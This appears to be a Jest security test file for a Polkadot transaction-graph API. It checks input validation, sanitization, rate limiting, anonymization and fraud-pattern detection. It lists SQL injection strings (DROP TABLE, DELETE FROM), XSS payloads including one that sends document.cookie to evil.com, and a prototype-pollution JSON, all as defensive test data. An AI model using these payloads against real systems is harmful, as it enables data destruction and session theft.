/**
 * Security Test Suite
 * 
 * Comprehensive tests for security vulnerabilities including:
 * - SQL Injection
 * - XSS Attacks
 * - CSRF Protection
 * - Rate Limiting
 * - Resource Exhaustion
 * - Business Logic Flaws
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import { app } from '../../src/server.js';
import { DatabaseService } from '../../src/services/DatabaseService.js';
import { QueryValidator, QueryComplexityAnalyzer, PrivacyProtection } from '../../src/security/index.js';

describe('Security Test Suite', () => {
  let db;

  beforeAll(async () => {
    db = new DatabaseService();
    await db.initialize();
  });

  afterAll(async () => {
    await db.close();
  });

  describe('SQL Injection Protection', () => {
    const sqlInjectionPayloads = [
      "1' OR '1'='1",
      "1'; DROP TABLE accounts; --",
      "1' UNION SELECT * FROM accounts --",
      "1\\'; DROP TABLE accounts; --",
      "1' AND 1=1 --",
      "1' OR 1=1#",
      "1' OR 1=1/*",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--"
    ];

    test.each(sqlInjectionPayloads)(
      'should reject SQL injection attempt: %s',
      async (payload) => {
        const response = await request(app)
          .get('/api/graph')
          .query({ address: payload })
          .expect(400);

        expect(response.body.error).toBeDefined();
        expect(response.body.error.message).toContain('Validation error');
      }
    );

    test('should handle SQL injection in numeric parameters', async () => {
      const response = await request(app)
        .get('/api/graph')
        .query({
          address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
          depth: '2 OR 1=1',
          maxNodes: '100; DELETE FROM accounts'
        })
        .expect(400);

      expect(response.body.error.details).toBeDefined();
    });

    test('should handle nested SQL injection attempts', async () => {
      const response = await request(app)
        .post('/api/investigations')
        .send({
          sessionId: '550e8400-e29b-41d4-a716-446655440000',
          title: "Investigation'; DROP TABLE investigations; --",
          addresses: ["1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww"]
        })
        .expect(400);

      expect(response.body.error).toBeDefined();
    });
  });

  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<script>document.cookie</script>',
      '<img src=x onerror=this.src="http://evil.com/steal?c="+document.cookie>',
      '${alert("XSS")}',
      '{{constructor.constructor("alert(1)")()}}'
    ];

    test.each(xssPayloads)(
      'should sanitize XSS attempt: %s',
      async (payload) => {
        const response = await request(app)
          .post('/api/investigations')
          .send({
            sessionId: '550e8400-e29b-41d4-a716-446655440000',
            title: payload,
            description: payload,
            addresses: ['1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww']
          });

        if (response.status === 200) {
          // Check that the payload was sanitized
          expect(response.body.title).not.toContain('<script>');
          expect(response.body.title).not.toContain('javascript:');
          expect(response.body.description).not.toContain('<script>');
          expect(response.body.description).not.toContain('javascript:');
        }
      }
    );
  });

  describe('Resource Exhaustion Protection', () => {
    test('should limit recursive query depth', async () => {
      const response = await request(app)
        .get('/api/graph')
        .query({
          address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
          depth: 100 // Attempting deep recursion
        })
        .expect(400);

      expect(response.body.error.details).toContainEqual(
        expect.objectContaining({
          field: 'depth',
          message: expect.stringContaining('max')
        })
      );
    });

    test('should limit maximum nodes returned', async () => {
      const response = await request(app)
        .get('/api/graph')
        .query({
          address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
          maxNodes: 10000 // Attempting to request too many nodes
        })
        .expect(400);

      expect(response.body.error.details).toContainEqual(
        expect.objectContaining({
          field: 'maxNodes',
          message: expect.stringContaining('max')
        })
      );
    });

    test('should reject overly complex queries', async () => {
      const complexQuery = {
        address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
        depth: 4,
        maxNodes: 500,
        filters: {
          minVolume: '1000000000000',
          maxVolume: '9999999999999',
          startTime: '2020-01-01T00:00:00Z',
          endTime: '2024-12-31T23:59:59Z',
          includeExchanges: true,
          includeValidators: true,
          riskScoreMin: 0.1,
          riskScoreMax: 0.9
        }
      };

      const complexity = QueryComplexityAnalyzer.calculateComplexity(complexQuery);
      expect(complexity.total).toBeGreaterThan(10);
    });
  });

  describe('Rate Limiting', () => {
    test('should enforce rate limits on expensive operations', async () => {
      const address = '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww';

      // Make requests up to the limit
      const requests = [];
      for (let i = 0; i < 5; i++) {
        requests.push(
          request(app)
            .get('/api/graph')
            .query({ address, depth: 3 })
        );
      }

      const responses = await Promise.all(requests);
      const successCount = responses.filter(r => r.status === 200).length;
      
      // Next request should be rate limited
      const limitedResponse = await request(app)
        .get('/api/graph')
        .query({ address, depth: 3 })
        .expect(429);

      expect(limitedResponse.body.error.message).toContain('rate limit');
      expect(limitedResponse.headers['retry-after']).toBeDefined();
      expect(limitedResponse.headers['x-ratelimit-limit']).toBeDefined();
      expect(limitedResponse.headers['x-ratelimit-remaining']).toBe('0');
    });

    test('should use cost-based rate limiting', async () => {
      // Graph queries should consume more budget than simple lookups
      const graphCost = 50;
      const lookupCost = 5;
      const budget = 100;

      // Should allow 2 graph queries (100 budget / 50 cost)
      for (let i = 0; i < 2; i++) {
        await request(app)
          .get('/api/graph')
          .query({ 
            address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww' 
          })
          .expect(200);
      }

      // Third graph query should be rejected
      await request(app)
        .get('/api/graph')
        .query({ 
          address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww' 
        })
        .expect(429);

      // But simple lookups might still work if budget allows
      // This depends on implementation details
    });
  });

  describe('Timing Attack Prevention', () => {
    test('should have consistent response times', async () => {
      const timings = {
        valid: [],
        invalid: []
      };

      // Measure valid address lookups
      for (let i = 0; i < 10; i++) {
        const start = Date.now();
        await request(app)
          .get('/api/addresses/1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww');
        timings.valid.push(Date.now() - start);
      }

      // Measure invalid address lookups
      for (let i = 0; i < 10; i++) {
        const start = Date.now();
        await request(app)
          .get('/api/addresses/1InvalidAddressThatDoesNotExist9999999999999999');
        timings.invalid.push(Date.now() - start);
      }

      // Calculate statistics
      const validAvg = timings.valid.reduce((a, b) => a + b) / timings.valid.length;
      const invalidAvg = timings.invalid.reduce((a, b) => a + b) / timings.invalid.length;
      
      // Timing difference should be minimal (< 50ms)
      expect(Math.abs(validAvg - invalidAvg)).toBeLessThan(50);

      // Variance should be low
      const allTimings = [...timings.valid, ...timings.invalid];
      const mean = allTimings.reduce((a, b) => a + b) / allTimings.length;
      const variance = allTimings.reduce((sum, time) => 
        sum + Math.pow(time - mean, 2), 0
      ) / allTimings.length;

      expect(variance).toBeLessThan(1000); // Low variance expected
    });
  });

  describe('Privacy Protection', () => {
    test('should anonymize graph data for unauthorized users', () => {
      const graphData = {
        nodes: [
          {
            address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
            identity_display: 'Alice',
            identity_email: 'alice@example.com',
            balance: '1234567890123456',
            risk_score: 0.2,
            total_transfers_in: 150,
            total_transfers_out: 200
          },
          {
            address: '14UBWBwX8rTq8qV7SUvvMjNnMbDeBdZmvH3uM5HgcEKhdEtT',
            identity_display: 'Bob',
            identity_email: 'bob@example.com',
            balance: '9876543210987654',
            risk_score: 0.8, // High risk - should not be anonymized
            total_transfers_in: 50,
            total_transfers_out: 30
          }
        ],
        edges: [
          {
            from: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
            to: '14UBWBwX8rTq8qV7SUvvMjNnMbDeBdZmvH3uM5HgcEKhdEtT',
            volume: '1000000000000000',
            transfer_count: 25
          }
        ]
      };

      const anonymized = PrivacyProtection.anonymizeGraphData(
        graphData,
        'user123',
        ['viewer'] // Basic permissions
      );

      // First node should be anonymized (low risk)
      expect(anonymized.nodes[0].address).toMatch(/^anon_/);
      expect(anonymized.nodes[0].identity_display).toBeNull();
      expect(anonymized.nodes[0].identity_email).toBeNull();
      expect(anonymized.nodes[0].balance).toBe('1K-10K DOT');

      // Second node should not be anonymized (high risk)
      expect(anonymized.nodes[1].address).toBe(graphData.nodes[1].address);
      expect(anonymized.nodes[1].risk_score).toBe(0.8);

      // Edge should use anonymized addresses where applicable
      expect(anonymized.edges[0].from).toMatch(/^anon_/);
      expect(anonymized.edges[0].volume).toBe('100-1K DOT');
    });

    test('should apply different anonymization levels based on permissions', () => {
      const graphData = {
        nodes: [
          {
            address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
            identity_display: 'Alice',
            balance: '1234567890123456',
            risk_score: 0.3,
            total_transfers_in: 100,
            total_transfers_out: 100
          }
        ],
        edges: []
      };

      // Test with admin permissions
      const adminResult = PrivacyProtection.anonymizeGraphData(
        graphData,
        'admin123',
        ['admin']
      );

      expect(adminResult.nodes[0].address).toBe(graphData.nodes[0].address);
      expect(adminResult.nodes[0].identity_display).toBe('Alice');
      expect(adminResult.metadata.anonymization_level).toBe('none');

      // Test with analyst permissions
      const analystResult = PrivacyProtection.anonymizeGraphData(
        graphData,
        'analyst123',
        ['analyst']
      );

      expect(analystResult.metadata.anonymization_level).toBe('minimal');

      // Test with viewer permissions
      const viewerResult = PrivacyProtection.anonymizeGraphData(
        graphData,
        'viewer123',
        ['viewer']
      );

      expect(viewerResult.nodes[0].address).toMatch(/^anon_/);
      expect(viewerResult.metadata.anonymization_level).toBe('standard');
    });
  });

  describe('Business Logic Security', () => {
    test('should detect wash trading patterns', async () => {
      // Create circular transaction pattern
      const addresses = [
        '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
        '14UBWBwX8rTq8qV7SUvvMjNnMbDeBdZmvH3uM5HgcEKhdEtT',
        '16FjXEQvA6VKnLMQVvh2WZfKcMvBBwTBqiiRiPSU2hCCb9Qs'
      ];

      // Create accounts
      for (const address of addresses) {
        await db.createAccount({
          address,
          balance: '1000000000000000',
          firstSeenBlock: 1000000
        });
      }

      // Create circular transfers
      for (let i = 0; i < addresses.length; i++) {
        const from = addresses[i];
        const to = addresses[(i + 1) % addresses.length];
        
        await db.createTransfer({
          hash: `wash_${i}_${Date.now()}`,
          from_address: from,
          to_address: to,
          value: '100000000000000', // Same amount
          timestamp: new Date().toISOString(),
          block_number: 1000000 + i,
          success: true
        });
      }

      // Check if pattern is detected
      const patterns = await db.getPatterns(addresses[0]);
      
      // Pattern detection might be async, so we check for the presence
      // of the pattern detection system
      expect(Array.isArray(patterns)).toBe(true);
    });

    test('should detect sybil attack patterns', async () => {
      const mainAddress = '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww';
      const sybilAddresses = [];

      // Create main account
      await db.createAccount({
        address: mainAddress,
        balance: '10000000000000000',
        firstSeenBlock: 1000000
      });

      // Create multiple sybil accounts at the same time
      const creationTime = new Date();
      for (let i = 0; i < 5; i++) {
        const sybilAddress = `1Sybil${i}${Date.now()}aaaaaaaaaaaaaaaaaaaaaaaaaa`;
        sybilAddresses.push(sybilAddress);

        await db.createAccount({
          address: sybilAddress,
          balance: '1000000000000',
          firstSeenBlock: 1000000,
          created_at: creationTime.toISOString()
        });

        // Create relationship with main account
        await db.createTransfer({
          hash: `sybil_${i}_${Date.now()}`,
          from_address: mainAddress,
          to_address: sybilAddress,
          value: '1000000000000',
          timestamp: creationTime.toISOString(),
          block_number: 1000001 + i,
          success: true
        });
      }

      // Pattern detection would identify these as suspicious
      const relationships = await db.getRelationships(mainAddress);
      expect(relationships.length).toBeGreaterThanOrEqual(5);
    });

    test('should prevent rapid reputation changes', async () => {
      // This would test the reputation system's resistance to manipulation
      // Implementation depends on the reputation system being active
    });
  });

  describe('Input Validation Edge Cases', () => {
    test('should handle Unicode and special characters', async () => {
      const unicodePayloads = [
        '🚀💎🔥', // Emojis
        '你好世界', // Chinese
        'مرحبا بالعالم', // Arabic
        '\\u0000', // Null character
        String.fromCharCode(0), // Actual null
        '\n\r\t', // Control characters
        '᠎', // Mongolian vowel separator (invisible)
        '​', // Zero-width space
      ];

      for (const payload of unicodePayloads) {
        const response = await request(app)
          .post('/api/investigations')
          .send({
            sessionId: '550e8400-e29b-41d4-a716-446655440000',
            title: `Test ${payload} Investigation`,
            addresses: ['1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww']
          });

        // Should either sanitize or reject based on implementation
        if (response.status === 200) {
          // Check that dangerous characters were handled
          expect(response.body.title).toBeDefined();
        }
      }
    });

    test('should handle homograph attacks in addresses', () => {
      const homographAddresses = [
        '1YМUxvhiFDTAuaDPpSrBfМfBA45pkiyQsQ6HrwGZnmcC4hww', // Cyrillic M
        '1YMUxvhⅰFDTAuaDPpSrBfMfBA45pkⅰyQsQ6HrwGZnmcC4hww', // Roman numeral i
        '1ΥMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww', // Greek Y
      ];

      for (const address of homographAddresses) {
        expect(() => {
          QueryValidator.validateAddress(address);
        }).toThrow();
      }
    });
  });

  describe('Security Headers', () => {
    test('should set appropriate security headers', async () => {
      const response = await request(app)
        .get('/api/graph')
        .query({
          address: '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww'
        });

      // Check security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toContain('max-age=31536000');
      
      // API responses should not be cached
      if (response.headers['cache-control']) {
        expect(response.headers['cache-control']).toContain('no-store');
        expect(response.headers['cache-control']).toContain('no-cache');
      }
    });
  });
});

describe('QueryValidator', () => {
  test('should validate Polkadot addresses correctly', () => {
    const validAddresses = [
      '1YMUxvhiFDTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww',
      '14UBWBwX8rTq8qV7SUvvMjNnMbDeBdZmvH3uM5HgcEKhdEtT',
      '16FjXEQvA6VKnLMQVvh2WZfKcMvBBwTBqiiRiPSU2hCCb9Qs'
    ];

    for (const address of validAddresses) {
      expect(() => QueryValidator.validateAddress(address)).not.toThrow();
    }
  });

  test('should reject invalid addresses', () => {
    const invalidAddresses = [
      '', // Empty
      'short', // Too short
      '0invalid0start0000000000000000000000000000000000', // Invalid start character
      '1' + 'a'.repeat(100), // Too long
      '1YMUxvhi!DTAuaDPpSrBfMfBA45pkiyQsQ6HrwGZnmcC4hww', // Invalid character
    ];

    for (const address of invalidAddresses) {
      expect(() => QueryValidator.validateAddress(address)).toThrow();
    }
  });

  test('should sanitize numeric values', () => {
    expect(QueryValidator.sanitizeNumeric('123')).toBe(123);
    expect(QueryValidator.sanitizeNumeric('abc')).toBe(0);
    expect(QueryValidator.sanitizeNumeric('123.456')).toBe(123);
    expect(QueryValidator.sanitizeNumeric('-999')).toBe(-999);
    expect(QueryValidator.sanitizeNumeric(null, 42)).toBe(42);
    expect(QueryValidator.sanitizeNumeric(undefined, 100)).toBe(100);
  });

  test('should enforce depth limits', () => {
    expect(QueryValidator.validateDepth(1)).toBe(1);
    expect(QueryValidator.validateDepth(4)).toBe(4);
    expect(QueryValidator.validateDepth(10)).toBe(4); // Max is 4
    expect(QueryValidator.validateDepth(-1)).toBe(2); // Default is 2
    expect(QueryValidator.validateDepth('abc')).toBe(2); // Default is 2
  });

  test('should safely parse JSON', () => {
    expect(QueryValidator.safeJsonParse('{"valid": "json"}')).toEqual({ valid: 'json' });
    expect(QueryValidator.safeJsonParse('invalid json')).toEqual({});
    expect(QueryValidator.safeJsonParse(null)).toEqual({});
    expect(QueryValidator.safeJsonParse('<script>alert("xss")</script>')).toEqual({});
    
    // Should handle malicious JSON
    const maliciousJson = '{"__proto__": {"isAdmin": true}}';
    const parsed = QueryValidator.safeJsonParse(maliciousJson);
    expect(parsed.__proto__).toBeUndefined();
  });
});

describe('QueryComplexityAnalyzer', () => {
  test('should calculate query complexity correctly', () => {
    const simpleQuery = {
      depth: 1,
      maxNodes: 10
    };

    const complexQuery = {
      depth: 4,
      maxNodes: 500,
      filters: {
        minVolume: '1000000',
        startTime: '2023-01-01',
        endTime: '2024-01-01'
      }
    };

    const simpleComplexity = QueryComplexityAnalyzer.calculateComplexity(simpleQuery);
    const complexComplexity = QueryComplexityAnalyzer.calculateComplexity(complexQuery);

    expect(simpleComplexity.total).toBeLessThan(5);
    expect(complexComplexity.total).toBeGreaterThan(10);
    expect(complexComplexity.estimated_time_ms).toBeGreaterThan(simpleComplexity.estimated_time_ms);
  });

  test('should calculate time range complexity', () => {
    const dayRange = QueryComplexityAnalyzer.calculateTimeRangeComplexity(
      '2024-01-01',
      '2024-01-02'
    );

    const yearRange = QueryComplexityAnalyzer.calculateTimeRangeComplexity(
      '2023-01-01',
      '2024-01-01'
    );

    expect(dayRange).toBeLessThan(yearRange);
    expect(yearRange).toBeGreaterThan(2); // log10(365) ≈ 2.56
  });
});